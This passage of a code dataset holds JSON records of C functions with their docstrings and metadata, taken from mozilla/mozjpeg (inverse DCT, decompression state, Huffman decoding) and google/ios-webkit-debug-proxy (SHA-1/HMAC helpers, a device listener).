*/\n\n  wsptr = workspace;\n  for (ctr = 0; ctr < 10; ctr++) {\n    outptr = output_buf[ctr] + output_col;\n\n    /* Even part */\n\n    /* Add fudge factor here for final descale. */\n    z3 = (JLONG)wsptr[0] + (ONE << (PASS1_BITS + 2));\n    z3 = LEFT_SHIFT(z3, CONST_BITS);\n    z4 = (JLONG)wsptr[4];\n    z1 = MULTIPLY(z4, FIX(1.144122806));         /* c4 */\n    z2 = MULTIPLY(z4, FIX(0.437016024));         /* c8 */\n    tmp10 = z3 + z1;\n    tmp11 = z3 - z2;\n\n    tmp22 = z3 - LEFT_SHIFT(z1 - z2, 1);         /* c0 = (c4-c8)*2 */\n\n    z2 = (JLONG)wsptr[2];\n    z3 = (JLONG)wsptr[6];\n\n    z1 = MULTIPLY(z2 + z3, FIX(0.831253876));    /* c6 */\n    tmp12 = z1 + MULTIPLY(z2, FIX(0.513743148)); /* c2-c6 */\n    tmp13 = z1 - MULTIPLY(z3, FIX(2.176250899)); /* c2+c6 */\n\n    tmp20 = tmp10 + tmp12;\n    tmp24 = tmp10 - tmp12;\n    tmp21 = tmp11 + tmp13;\n    tmp23 = tmp11 - tmp13;\n\n    /* Odd part */\n\n    z1 = (JLONG)wsptr[1];\n    z2 = (JLONG)wsptr[3];\n    z3 = (JLONG)wsptr[5];\n    z3 = LEFT_SHIFT(z3, CONST_BITS);\n    z4 = (JLONG)wsptr[7];\n\n    tmp11 = z2 + z4;\n    tmp13 = z2 - z4;\n\n    tmp12 = MULTIPLY(tmp13, FIX(0.309016994));        /* (c3-c7)/2 */\n\n    z2 = MULTIPLY(tmp11, FIX(0.951056516));           /* (c3+c7)/2 */\n    z4 = z3 + tmp12;\n\n    tmp10 = MULTIPLY(z1, FIX(1.396802247)) + z2 + z4; /* c1 */\n    tmp14 = MULTIPLY(z1, FIX(0.221231742)) - z2 + z4; /* c9 */\n\n    z2 = MULTIPLY(tmp11, FIX(0.587785252));           /* (c1-c9)/2 */\n    z4 = z3 - tmp12 - LEFT_SHIFT(tmp13, CONST_BITS - 1);\n\n    tmp12 = LEFT_SHIFT(z1 - tmp13, CONST_BITS) - z3;\n\n    tmp11 = MULTIPLY(z1, FIX(1.260073511)) - z2 - z4; /* c3 */\n    tmp13 = MULTIPLY(z1, FIX(0.642039522)) - z2 + z4; /* c7 */\n\n    /* Final output stage */\n\n    outptr[0] = range_limit[(int)RIGHT_SHIFT(tmp20 + tmp10,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[9] = range_limit[(int)RIGHT_SHIFT(tmp20 - tmp10,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[1] = range_limit[(int)RIGHT_SHIFT(tmp21 + tmp11,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[8] = range_limit[(int)RIGHT_SHIFT(tmp21 - tmp11,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[2] = range_limit[(int)RIGHT_SHIFT(tmp22 + tmp12,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[7] = range_limit[(int)RIGHT_SHIFT(tmp22 - tmp12,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[3] = range_limit[(int)RIGHT_SHIFT(tmp23 + tmp13,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[6] = range_limit[(int)RIGHT_SHIFT(tmp23 - tmp13,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[4] = range_limit[(int)RIGHT_SHIFT(tmp24 + tmp14,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[5] = range_limit[(int)RIGHT_SHIFT(tmp24 - tmp14,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n\n    wsptr += 8;         /* advance pointer to next row */\n  }\n}", "path": "mozjpeg/jidctint.c", "commit_date": "2020-11-05 00:00:00", "repo_name": "mozilla/mozjpeg", "stars": 5317, "license": "other", "language": "c", "size": 14984}
{"docstring": "/*\n * Consume data in advance of what the decompressor requires.\n * This can be called at any time once the decompressor object has\n * been created and a data source has been set up.\n *\n * This routine is essentially a state machine that handles a couple\n * of critical state-transition actions, namely initial setup and\n * transition from header scanning to ready-for-start_decompress.\n * All the actual input is done via the input controller's consume_input\n * method.\n */\n", "func_signal": "GLOBAL(int)\njpeg_consume_input(j_decompress_ptr cinfo)", "code": "{\n  int retcode = JPEG_SUSPENDED;\n\n  /* NB: every possible DSTATE value should be listed in this switch */\n  switch (cinfo->global_state) {\n  case DSTATE_START:\n    /* Start-of-datastream actions: reset appropriate modules */\n    (*cinfo->inputctl->reset_input_controller) (cinfo);\n    /* Initialize application's data source module */\n    (*cinfo->src->init_source) (cinfo);\n    cinfo->global_state = DSTATE_INHEADER;\n    /*FALLTHROUGH*/\n  case DSTATE_INHEADER:\n    retcode = (*cinfo->inputctl->consume_input) (cinfo);\n    if (retcode == JPEG_REACHED_SOS) { /* Found SOS, prepare to decompress */\n      /* Set up default parameters based on header data */\n      default_decompress_parms(cinfo);\n      /* Set global state: ready for start_decompress */\n      cinfo->global_state = DSTATE_READY;\n    }\n    break;\n  case DSTATE_READY:\n    /* Can't advance past first SOS until start_decompress is called */\n    retcode = JPEG_REACHED_SOS;\n    break;\n  case DSTATE_PRELOAD:\n  case DSTATE_PRESCAN:\n  case DSTATE_SCANNING:\n  case DSTATE_RAW_OK:\n  case DSTATE_BUFIMAGE:\n  case DSTATE_BUFPOST:\n  case DSTATE_STOPPING:\n    retcode = (*cinfo->inputctl->consume_input) (cinfo);\n    break;\n  default:\n    ERREXIT1(cinfo, JERR_BAD_STATE, cinfo->global_state);\n  }\n  return retcode;\n}", "path": "mozjpeg/jdapimin.c", "commit_date": "2018-03-16 00:00:00", "repo_name": "mozilla/mozjpeg", "stars": 5317, "license": "other", "language": "c", "size": 14984}
{"docstring": "/*\n * Perform dequantization and inverse DCT on one block of coefficients,\n * producing a reduced-size 7x7 output block.\n *\n * Optimized algorithm with 12 multiplications in the 1-D kernel.\n * cK represents sqrt(2) * cos(K*pi/14).\n */\n", "func_signal": "GLOBAL(void)\njpeg_idct_7x7(j_decompress_ptr cinfo, jpeg_component_info *compptr,\n              JCOEFPTR coef_block, JSAMPARRAY output_buf,\n              JDIMENSION output_col)", "code": "{\n  JLONG tmp0, tmp1, tmp2, tmp10, tmp11, tmp12, tmp13;\n  JLONG z1, z2, z3;\n  JCOEFPTR inptr;\n  ISLOW_MULT_TYPE *quantptr;\n  int *wsptr;\n  JSAMPROW outptr;\n  JSAMPLE *range_limit = IDCT_range_limit(cinfo);\n  int ctr;\n  int workspace[7 * 7];         /* buffers data between passes */\n  SHIFT_TEMPS\n\n  /* Pass 1: process columns from input, store into work array. */\n\n  inptr = coef_block;\n  quantptr = (ISLOW_MULT_TYPE *)compptr->dct_table;\n  wsptr = workspace;\n  for (ctr = 0; ctr < 7; ctr++, inptr++, quantptr++, wsptr++) {\n    /* Even part */\n\n    tmp13 = DEQUANTIZE(inptr[DCTSIZE * 0], quantptr[DCTSIZE * 0]);\n    tmp13 = LEFT_SHIFT(tmp13, CONST_BITS);\n    /* Add fudge factor here for final descale. */\n    tmp13 += ONE << (CONST_BITS - PASS1_BITS - 1);\n\n    z1 = DEQUANTIZE(inptr[DCTSIZE * 2], quantptr[DCTSIZE * 2]);\n    z2 = DEQUANTIZE(inptr[DCTSIZE * 4], quantptr[DCTSIZE * 4]);\n    z3 = DEQUANTIZE(inptr[DCTSIZE * 6], quantptr[DCTSIZE * 6]);\n\n    tmp10 = MULTIPLY(z2 - z3, FIX(0.881747734));     /* c4 */\n    tmp12 = MULTIPLY(z1 - z2, FIX(0.314692123));     /* c6 */\n    tmp11 = tmp10 + tmp12 + tmp13 - MULTIPLY(z2, FIX(1.841218003)); /* c2+c4-c6 */\n    tmp0 = z1 + z3;\n    z2 -= tmp0;\n    tmp0 = MULTIPLY(tmp0, FIX(1.274162392)) + tmp13; /* c2 */\n    tmp10 += tmp0 - MULTIPLY(z3, FIX(0.077722536));  /* c2-c4-c6 */\n    tmp12 += tmp0 - MULTIPLY(z1, FIX(2.470602249));  /* c2+c4+c6 */\n    tmp13 += MULTIPLY(z2, FIX(1.414213562));         /* c0 */\n\n    /* Odd part */\n\n    z1 = DEQUANTIZE(inptr[DCTSIZE * 1], quantptr[DCTSIZE * 1]);\n    z2 = DEQUANTIZE(inptr[DCTSIZE * 3], quantptr[DCTSIZE * 3]);\n    z3 = DEQUANTIZE(inptr[DCTSIZE * 5], quantptr[DCTSIZE * 5]);\n\n    tmp1 = MULTIPLY(z1 + z2, FIX(0.935414347));      /* (c3+c1-c5)/2 */\n    tmp2 = MULTIPLY(z1 - z2, FIX(0.170262339));      /* (c3+c5-c1)/2 */\n    tmp0 = tmp1 - tmp2;\n    tmp1 += tmp2;\n    tmp2 = MULTIPLY(z2 + z3, -FIX(1.378756276));     /* -c1 */\n    tmp1 += tmp2;\n    z2 = MULTIPLY(z1 + z3, FIX(0.613604268));        /* c5 */\n    tmp0 += z2;\n    tmp2 += z2 + MULTIPLY(z3, FIX(1.870828693));     /* c3+c1-c5 */\n\n    /* Final output stage */\n\n    wsptr[7 * 0] = (int)RIGHT_SHIFT(tmp10 + tmp0, CONST_BITS - PASS1_BITS);\n    wsptr[7 * 6] = (int)RIGHT_SHIFT(tmp10 - tmp0, CONST_BITS - PASS1_BITS);\n    wsptr[7 * 1] = (int)RIGHT_SHIFT(tmp11 + tmp1, CONST_BITS - PASS1_BITS);\n    wsptr[7 * 5] = (int)RIGHT_SHIFT(tmp11 - tmp1, CONST_BITS - PASS1_BITS);\n    wsptr[7 * 2] = (int)RIGHT_SHIFT(tmp12 + tmp2, CONST_BITS - PASS1_BITS);\n    wsptr[7 * 4] = (int)RIGHT_SHIFT(tmp12 - tmp2, CONST_BITS - PASS1_BITS);\n    wsptr[7 * 3] = (int)RIGHT_SHIFT(tmp13, CONST_BITS - PASS1_BITS);\n  }\n\n  /* Pass 2: process 7 rows from work array, store into output array. */\n\n  wsptr = workspace;\n  for (ctr = 0; ctr < 7; ctr++) {\n    outptr = output_buf[ctr] + output_col;\n\n    /* Even part */\n\n    /* Add fudge factor here for final descale. */\n    tmp13 = (JLONG)wsptr[0] + (ONE << (PASS1_BITS + 2));\n    tmp13 = LEFT_SHIFT(tmp13, CONST_BITS);\n\n    z1 = (JLONG)wsptr[2];\n    z2 = (JLONG)wsptr[4];\n    z3 = (JLONG)wsptr[6];\n\n    tmp10 = MULTIPLY(z2 - z3, FIX(0.881747734));     /* c4 */\n    tmp12 = MULTIPLY(z1 - z2, FIX(0.314692123));     /* c6 */\n    tmp11 = tmp10 + tmp12 + tmp13 - MULTIPLY(z2, FIX(1.841218003)); /* c2+c4-c6 */\n    tmp0 = z1 + z3;\n    z2 -= tmp0;\n    tmp0 = MULTIPLY(tmp0, FIX(1.274162392)) + tmp13; /* c2 */\n    tmp10 += tmp0 - MULTIPLY(z3, FIX(0.077722536));  /* c2-c4-c6 */\n    tmp12 += tmp0 - MULTIPLY(z1, FIX(2.470602249));  /* c2+c4+c6 */\n    tmp13 += MULTIPLY(z2, FIX(1.414213562));         /* c0 */\n\n    /* Odd part */\n\n    z1 = (JLONG)wsptr[1];\n    z2 = (JLONG)wsptr[3];\n    z3 = (JLONG)wsptr[5];\n\n    tmp1 = MULTIPLY(z1 + z2, FIX(0.935414347));      /* (c3+c1-c5)/2 */\n    tmp2 = MULTIPLY(z1 - z2, FIX(0.170262339));      /* (c3+c5-c1)/2 */\n    tmp0 = tmp1 - tmp2;\n    tmp1 += tmp2;\n    tmp2 = MULTIPLY(z2 + z3, -FIX(1.378756276));     /* -c1 */\n    tmp1 += tmp2;\n    z2 = MULTIPLY(z1 + z3, FIX(0.613604268));        /* c5 */\n    tmp0 += z2;\n    tmp2 += z2 + MULTIPLY(z3, FIX(1.870828693));     /* c3+c1-c5 */\n\n    /* Final output stage */\n\n    outptr[0] = range_limit[(int)RIGHT_SHIFT(tmp10 + tmp0,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[6] = range_limit[(int)RIGHT_SHIFT(tmp10 - tmp0,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[1] = range_limit[(int)RIGHT_SHIFT(tmp11 + tmp1,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[5] = range_limit[(int)RIGHT_SHIFT(tmp11 - tmp1,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[2] = range_limit[(int)RIGHT_SHIFT(tmp12 + tmp2,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[4] = range_limit[(int)RIGHT_SHIFT(tmp12 - tmp2,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[3] = range_limit[(int)RIGHT_SHIFT(tmp13,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n\n    wsptr += 7;         /* advance pointer to next row */\n  }\n}", "path": "mozjpeg/jidctint.c", "commit_date": "2020-11-05 00:00:00", "repo_name": "mozilla/mozjpeg", "stars": 5317, "license": "other", "language": "c", "size": 14984}
{"docstring": "/*\n * Set default decompression parameters.\n */\n", "func_signal": "LOCAL(void)\ndefault_decompress_parms(j_decompress_ptr cinfo)", "code": "{\n  /* Guess the input colorspace, and set output colorspace accordingly. */\n  /* (Wish JPEG committee had provided a real way to specify this...) */\n  /* Note application may override our guesses. */\n  switch (cinfo->num_components) {\n  case 1:\n    cinfo->jpeg_color_space = JCS_GRAYSCALE;\n    cinfo->out_color_space = JCS_GRAYSCALE;\n    break;\n\n  case 3:\n    if (cinfo->saw_JFIF_marker) {\n      cinfo->jpeg_color_space = JCS_YCbCr; /* JFIF implies YCbCr */\n    } else if (cinfo->saw_Adobe_marker) {\n      switch (cinfo->Adobe_transform) {\n      case 0:\n        cinfo->jpeg_color_space = JCS_RGB;\n        break;\n      case 1:\n        cinfo->jpeg_color_space = JCS_YCbCr;\n        break;\n      default:\n        WARNMS1(cinfo, JWRN_ADOBE_XFORM, cinfo->Adobe_transform);\n        cinfo->jpeg_color_space = JCS_YCbCr; /* assume it's YCbCr */\n        break;\n      }\n    } else {\n      /* Saw no special markers, try to guess from the component IDs */\n      int cid0 = cinfo->comp_info[0].component_id;\n      int cid1 = cinfo->comp_info[1].component_id;\n      int cid2 = cinfo->comp_info[2].component_id;\n\n      if (cid0 == 1 && cid1 == 2 && cid2 == 3)\n        cinfo->jpeg_color_space = JCS_YCbCr; /* assume JFIF w/out marker */\n      else if (cid0 == 82 && cid1 == 71 && cid2 == 66)\n        cinfo->jpeg_color_space = JCS_RGB; /* ASCII 'R', 'G', 'B' */\n      else {\n        TRACEMS3(cinfo, 1, JTRC_UNKNOWN_IDS, cid0, cid1, cid2);\n        cinfo->jpeg_color_space = JCS_YCbCr; /* assume it's YCbCr */\n      }\n    }\n    /* Always guess RGB is proper output colorspace. */\n    cinfo->out_color_space = JCS_RGB;\n    break;\n\n  case 4:\n    if (cinfo->saw_Adobe_marker) {\n      switch (cinfo->Adobe_transform) {\n      case 0:\n        cinfo->jpeg_color_space = JCS_CMYK;\n        break;\n      case 2:\n        cinfo->jpeg_color_space = JCS_YCCK;\n        break;\n      default:\n        WARNMS1(cinfo, JWRN_ADOBE_XFORM, cinfo->Adobe_transform);\n        cinfo->jpeg_color_space = JCS_YCCK; /* assume it's YCCK */\n        break;\n      }\n    } else {\n      /* No special markers, assume straight CMYK. */\n      cinfo->jpeg_color_space = JCS_CMYK;\n    }\n    cinfo->out_color_space = JCS_CMYK;\n    break;\n\n  default:\n    cinfo->jpeg_color_space = JCS_UNKNOWN;\n    cinfo->out_color_space = JCS_UNKNOWN;\n    break;\n  }\n\n  /* Set defaults for other decompression parameters. */\n  cinfo->scale_num = 1;         /* 1:1 scaling */\n  cinfo->scale_denom = 1;\n  cinfo->output_gamma = 1.0;\n  cinfo->buffered_image = FALSE;\n  cinfo->raw_data_out = FALSE;\n  cinfo->dct_method = JDCT_DEFAULT;\n  cinfo->do_fancy_upsampling = TRUE;\n  cinfo->do_block_smoothing = TRUE;\n  cinfo->quantize_colors = FALSE;\n  /* We set these in case application only sets quantize_colors. */\n  cinfo->dither_mode = JDITHER_FS;\n#ifdef QUANT_2PASS_SUPPORTED\n  cinfo->two_pass_quantize = TRUE;\n#else\n  cinfo->two_pass_quantize = FALSE;\n#endif\n  cinfo->desired_number_of_colors = 256;\n  cinfo->colormap = NULL;\n  /* Initialize for no mode change in buffered-image mode. */\n  cinfo->enable_1pass_quant = FALSE;\n  cinfo->enable_external_quant = FALSE;\n  cinfo->enable_2pass_quant = FALSE;\n}", "path": "mozjpeg/jdapimin.c", "commit_date": "2018-03-16 00:00:00", "repo_name": "mozilla/mozjpeg", "stars": 5317, "license": "other", "language": "c", "size": 14984}
{"docstring": "/*\n * Perform dequantization and inverse DCT on one block of coefficients,\n * producing a reduced-size 5x5 output block.\n *\n * Optimized algorithm with 5 multiplications in the 1-D kernel.\n * cK represents sqrt(2) * cos(K*pi/10).\n */\n", "func_signal": "GLOBAL(void)\njpeg_idct_5x5(j_decompress_ptr cinfo, jpeg_component_info *compptr,\n              JCOEFPTR coef_block, JSAMPARRAY output_buf,\n              JDIMENSION output_col)", "code": "{\n  JLONG tmp0, tmp1, tmp10, tmp11, tmp12;\n  JLONG z1, z2, z3;\n  JCOEFPTR inptr;\n  ISLOW_MULT_TYPE *quantptr;\n  int *wsptr;\n  JSAMPROW outptr;\n  JSAMPLE *range_limit = IDCT_range_limit(cinfo);\n  int ctr;\n  int workspace[5 * 5];         /* buffers data between passes */\n  SHIFT_TEMPS\n\n  /* Pass 1: process columns from input, store into work array. */\n\n  inptr = coef_block;\n  quantptr = (ISLOW_MULT_TYPE *)compptr->dct_table;\n  wsptr = workspace;\n  for (ctr = 0; ctr < 5; ctr++, inptr++, quantptr++, wsptr++) {\n    /* Even part */\n\n    tmp12 = DEQUANTIZE(inptr[DCTSIZE * 0], quantptr[DCTSIZE * 0]);\n    tmp12 = LEFT_SHIFT(tmp12, CONST_BITS);\n    /* Add fudge factor here for final descale. */\n    tmp12 += ONE << (CONST_BITS - PASS1_BITS - 1);\n    tmp0 = DEQUANTIZE(inptr[DCTSIZE * 2], quantptr[DCTSIZE * 2]);\n    tmp1 = DEQUANTIZE(inptr[DCTSIZE * 4], quantptr[DCTSIZE * 4]);\n    z1 = MULTIPLY(tmp0 + tmp1, FIX(0.790569415)); /* (c2+c4)/2 */\n    z2 = MULTIPLY(tmp0 - tmp1, FIX(0.353553391)); /* (c2-c4)/2 */\n    z3 = tmp12 + z2;\n    tmp10 = z3 + z1;\n    tmp11 = z3 - z1;\n    tmp12 -= LEFT_SHIFT(z2, 2);\n\n    /* Odd part */\n\n    z2 = DEQUANTIZE(inptr[DCTSIZE * 1], quantptr[DCTSIZE * 1]);\n    z3 = DEQUANTIZE(inptr[DCTSIZE * 3], quantptr[DCTSIZE * 3]);\n\n    z1 = MULTIPLY(z2 + z3, FIX(0.831253876));     /* c3 */\n    tmp0 = z1 + MULTIPLY(z2, FIX(0.513743148));   /* c1-c3 */\n    tmp1 = z1 - MULTIPLY(z3, FIX(2.176250899));   /* c1+c3 */\n\n    /* Final output stage */\n\n    wsptr[5 * 0] = (int)RIGHT_SHIFT(tmp10 + tmp0, CONST_BITS - PASS1_BITS);\n    wsptr[5 * 4] = (int)RIGHT_SHIFT(tmp10 - tmp0, CONST_BITS - PASS1_BITS);\n    wsptr[5 * 1] = (int)RIGHT_SHIFT(tmp11 + tmp1, CONST_BITS - PASS1_BITS);\n    wsptr[5 * 3] = (int)RIGHT_SHIFT(tmp11 - tmp1, CONST_BITS - PASS1_BITS);\n    wsptr[5 * 2] = (int)RIGHT_SHIFT(tmp12, CONST_BITS - PASS1_BITS);\n  }\n\n  /* Pass 2: process 5 rows from work array, store into output array. */\n\n  wsptr = workspace;\n  for (ctr = 0; ctr < 5; ctr++) {\n    outptr = output_buf[ctr] + output_col;\n\n    /* Even part */\n\n    /* Add fudge factor here for final descale. */\n    tmp12 = (JLONG)wsptr[0] + (ONE << (PASS1_BITS + 2));\n    tmp12 = LEFT_SHIFT(tmp12, CONST_BITS);\n    tmp0 = (JLONG)wsptr[2];\n    tmp1 = (JLONG)wsptr[4];\n    z1 = MULTIPLY(tmp0 + tmp1, FIX(0.790569415)); /* (c2+c4)/2 */\n    z2 = MULTIPLY(tmp0 - tmp1, FIX(0.353553391)); /* (c2-c4)/2 */\n    z3 = tmp12 + z2;\n    tmp10 = z3 + z1;\n    tmp11 = z3 - z1;\n    tmp12 -= LEFT_SHIFT(z2, 2);\n\n    /* Odd part */\n\n    z2 = (JLONG)wsptr[1];\n    z3 = (JLONG)wsptr[3];\n\n    z1 = MULTIPLY(z2 + z3, FIX(0.831253876));     /* c3 */\n    tmp0 = z1 + MULTIPLY(z2, FIX(0.513743148));   /* c1-c3 */\n    tmp1 = z1 - MULTIPLY(z3, FIX(2.176250899));   /* c1+c3 */\n\n    /* Final output stage */\n\n    outptr[0] = range_limit[(int)RIGHT_SHIFT(tmp10 + tmp0,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[4] = range_limit[(int)RIGHT_SHIFT(tmp10 - tmp0,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[1] = range_limit[(int)RIGHT_SHIFT(tmp11 + tmp1,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[3] = range_limit[(int)RIGHT_SHIFT(tmp11 - tmp1,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n    outptr[2] = range_limit[(int)RIGHT_SHIFT(tmp12,\n                                             CONST_BITS + PASS1_BITS + 3) &\n                            RANGE_MASK];\n\n    wsptr += 5;         /* advance pointer to next row */\n  }\n}", "path": "mozjpeg/jidctint.c", "commit_date": "2020-11-05 00:00:00", "repo_name": "mozilla/mozjpeg", "stars": 5317, "license": "other", "language": "c", "size": 14984}
{"docstring": "/*\n * Check for a restart marker & resynchronize decoder.\n * Returns FALSE if must suspend.\n */\n", "func_signal": "LOCAL(boolean)\nprocess_restart(j_decompress_ptr cinfo)", "code": "{\n  huff_entropy_ptr entropy = (huff_entropy_ptr)cinfo->entropy;\n  int ci;\n\n  /* Throw away any unused bits remaining in bit buffer; */\n  /* include any full bytes in next_marker's count of discarded bytes */\n  cinfo->marker->discarded_bytes += entropy->bitstate.bits_left / 8;\n  entropy->bitstate.bits_left = 0;\n\n  /* Advance past the RSTn marker */\n  if (!(*cinfo->marker->read_restart_marker) (cinfo))\n    return FALSE;\n\n  /* Re-initialize DC predictions to 0 */\n  for (ci = 0; ci < cinfo->comps_in_scan; ci++)\n    entropy->saved.last_dc_val[ci] = 0;\n\n  /* Reset restart counter */\n  entropy->restarts_to_go = cinfo->restart_interval;\n\n  /* Reset out-of-data flag, unless read_restart_marker left us smack up\n   * against a marker.  In that case we will end up treating the next data\n   * segment as empty, and we can avoid producing bogus output pixels by\n   * leaving the flag set.\n   */\n  if (cinfo->unread_marker == 0)\n    entropy->pub.insufficient_data = FALSE;\n\n  return TRUE;\n}", "path": "mozjpeg/jdhuff.c", "commit_date": "2019-12-11 00:00:00", "repo_name": "mozilla/mozjpeg", "stars": 5317, "license": "other", "language": "c", "size": 14984}
{"docstring": "/*\n * Module initialization routine for Huffman entropy decoding.\n */\n", "func_signal": "GLOBAL(void)\njinit_huff_decoder(j_decompress_ptr cinfo)", "code": "{\n  huff_entropy_ptr entropy;\n  int i;\n\n  /* Motion JPEG frames typically do not include the Huffman tables if they\n     are the default tables.  Thus, if the tables are not set by the time\n     the Huffman decoder is initialized (usually within the body of\n     jpeg_start_decompress()), we set them to default values. */\n  std_huff_tables((j_common_ptr)cinfo);\n\n  entropy = (huff_entropy_ptr)\n    (*cinfo->mem->alloc_small) ((j_common_ptr)cinfo, JPOOL_IMAGE,\n                                sizeof(huff_entropy_decoder));\n  cinfo->entropy = (struct jpeg_entropy_decoder *)entropy;\n  entropy->pub.start_pass = start_pass_huff_decoder;\n  entropy->pub.decode_mcu = decode_mcu;\n\n  /* Mark tables unallocated */\n  for (i = 0; i < NUM_HUFF_TBLS; i++) {\n    entropy->dc_derived_tbls[i] = entropy->ac_derived_tbls[i] = NULL;\n  }\n}", "path": "mozjpeg/jdhuff.c", "commit_date": "2019-12-11 00:00:00", "repo_name": "mozilla/mozjpeg", "stars": 5317, "license": "other", "language": "c", "size": 14984}
{"docstring": "/*\n * Have we finished reading the input file?\n */\n", "func_signal": "GLOBAL(boolean)\njpeg_input_complete(j_decompress_ptr cinfo)", "code": "{\n  /* Check for valid jpeg object */\n  if (cinfo->global_state < DSTATE_START ||\n      cinfo->global_state > DSTATE_STOPPING)\n    ERREXIT1(cinfo, JERR_BAD_STATE, cinfo->global_state);\n  return cinfo->inputctl->eoi_reached;\n}", "path": "mozjpeg/jdapimin.c", "commit_date": "2018-03-16 00:00:00", "repo_name": "mozilla/mozjpeg", "stars": 5317, "license": "other", "language": "c", "size": 14984}
{"docstring": "/*\n * Finish JPEG decompression.\n *\n * This will normally just verify the file trailer and release temp storage.\n *\n * Returns FALSE if suspended.  The return value need be inspected only if\n * a suspending data source is used.\n */\n", "func_signal": "GLOBAL(boolean)\njpeg_finish_decompress(j_decompress_ptr cinfo)", "code": "{\n  if ((cinfo->global_state == DSTATE_SCANNING ||\n       cinfo->global_state == DSTATE_RAW_OK) && !cinfo->buffered_image) {\n    /* Terminate final pass of non-buffered mode */\n    if (cinfo->output_scanline < cinfo->output_height)\n      ERREXIT(cinfo, JERR_TOO_LITTLE_DATA);\n    (*cinfo->master->finish_output_pass) (cinfo);\n    cinfo->global_state = DSTATE_STOPPING;\n  } else if (cinfo->global_state == DSTATE_BUFIMAGE) {\n    /* Finishing after a buffered-image operation */\n    cinfo->global_state = DSTATE_STOPPING;\n  } else if (cinfo->global_state != DSTATE_STOPPING) {\n    /* STOPPING = repeat call after a suspension, anything else is error */\n    ERREXIT1(cinfo, JERR_BAD_STATE, cinfo->global_state);\n  }\n  /* Read until EOI */\n  while (!cinfo->inputctl->eoi_reached) {\n    if ((*cinfo->inputctl->consume_input) (cinfo) == JPEG_SUSPENDED)\n      return FALSE;             /* Suspend, come back later */\n  }\n  /* Do final cleanup */\n  (*cinfo->src->term_source) (cinfo);\n  /* We can use jpeg_abort to release memory and reset global_state */\n  jpeg_abort((j_common_ptr)cinfo);\n  return TRUE;\n}", "path": "mozjpeg/jdapimin.c", "commit_date": "2018-03-16 00:00:00", "repo_name": "mozilla/mozjpeg", "stars": 5317, "license": "other", "language": "c", "size": 14984}
{"docstring": "/*\n * Is there more than one scan?\n */\n", "func_signal": "GLOBAL(boolean)\njpeg_has_multiple_scans(j_decompress_ptr cinfo)", "code": "{\n  /* Only valid after jpeg_read_header completes */\n  if (cinfo->global_state < DSTATE_READY ||\n      cinfo->global_state > DSTATE_STOPPING)\n    ERREXIT1(cinfo, JERR_BAD_STATE, cinfo->global_state);\n  return cinfo->inputctl->has_multiple_scans;\n}", "path": "mozjpeg/jdapimin.c", "commit_date": "2018-03-16 00:00:00", "repo_name": "mozilla/mozjpeg", "stars": 5317, "license": "other", "language": "c", "size": 14984}
{"docstring": "/*\n * output = HMAC-SHA-1( hmac key, input buffer )\n */\n", "func_signal": "void sha1_hmac( const unsigned char *key, size_t keylen,\n                const unsigned char *input, size_t ilen,\n                unsigned char output[20] )", "code": "{\n    sha1_context ctx;\n\n    sha1_hmac_starts( &ctx, key, keylen );\n    sha1_hmac_update( &ctx, input, ilen );\n    sha1_hmac_finish( &ctx, output );\n\n    memset( &ctx, 0, sizeof( sha1_context ) );\n}", "path": "ios-webkit-debug-proxy/src/sha1.c", "commit_date": "2017-04-09 00:00:00", "repo_name": "google/ios-webkit-debug-proxy", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 674}
{"docstring": "/*\n * output = SHA-1( input buffer )\n */\n", "func_signal": "void sha1( const unsigned char *input, size_t ilen, unsigned char output[20] )", "code": "{\n    sha1_context ctx;\n\n    sha1_starts( &ctx );\n    sha1_update( &ctx, input, ilen );\n    sha1_finish( &ctx, output );\n\n    memset( &ctx, 0, sizeof( sha1_context ) );\n}", "path": "ios-webkit-debug-proxy/src/sha1.c", "commit_date": "2017-04-09 00:00:00", "repo_name": "google/ios-webkit-debug-proxy", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 674}
{"docstring": "//\n// device_listener\n//\n", "func_signal": "dl_status iwdp_listen(iwdp_t self, const char *device_id)", "code": "{\n  iwdp_private_t my = self->private_state;\n\n  // see if this device was previously attached\n  ht_t iport_ht = my->device_id_to_iport;\n  iwdp_iport_t iport = (iwdp_iport_t)ht_get_value(iport_ht, device_id);\n  if (iport && iport->s_fd > 0) {\n    return self->on_error(self, \"%s already on :%d\", device_id,\n        iport->port);\n  }\n  int port = (iport ? iport->port : -1);\n\n  // select new port\n  int min_port = -1;\n  int max_port = -1;\n  if (self->select_port && self->select_port(self, device_id,\n        &port, &min_port, &max_port)) {\n    return (device_id ? DL_ERROR : DL_SUCCESS);\n  }\n  if (port < 0 && (min_port < 0 || max_port < min_port)) {\n    return (device_id ? DL_ERROR : DL_SUCCESS); // ignore this device\n  }\n  if (!iport) {\n    iport = iwdp_iport_new();\n    iport->device_id = (device_id ? strdup(device_id) : NULL);\n    